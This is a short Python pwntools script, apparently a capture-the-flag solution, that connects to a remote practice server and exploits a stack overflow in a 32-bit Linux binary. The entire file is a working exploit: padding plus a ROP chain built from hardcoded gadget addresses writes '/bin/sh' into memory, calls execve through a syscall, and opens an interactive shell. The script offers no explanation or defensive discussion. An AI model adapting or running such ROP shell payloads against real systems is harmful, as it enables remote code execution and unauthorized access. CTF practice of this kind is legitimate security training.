#!/usr/bin/env python
# Wildfoot
from pwn import *

context.update(arch="i386", os="linux")

host = "127.0.0.1"
port = 8888
host = "hackme.inndy.tw"
port = 7704

r = remote(host, port)
#r = process("./a.out")

input("attach in gdb and press Enter")

syscall = 0x080627cd
syscall = 0x0806f42e
pop_eax = 0x080b8016
mov_dedx_eax = 0x0805466b
pop_edx = 0x0806ecda
buf = 0x80ea060
pop_ebx = 0x080481c9
pop_ecx = 0x080de769
xor_eax_eax = 0x080492d3

payload = flat(["A" * 16])
payload += flat([pop_edx, buf, pop_eax, "/bin", mov_dedx_eax])
payload += flat([pop_edx, buf + 0x04, pop_eax, "/sh\x00", mov_dedx_eax])
payload += flat([pop_edx, buf + 0x08, xor_eax_eax, mov_dedx_eax])
payload += flat([pop_eax, 0x0b, pop_ebx, buf, pop_ecx, 0x0, pop_edx, 0x0, syscall])

#print(payload)

#r.recvuntil(":")
r.sendline(payload)

# puts = u64(r.recvuntil("\n").strip().ljust(8, b"\x00"))
# print(hex(puts))

r.interactive()
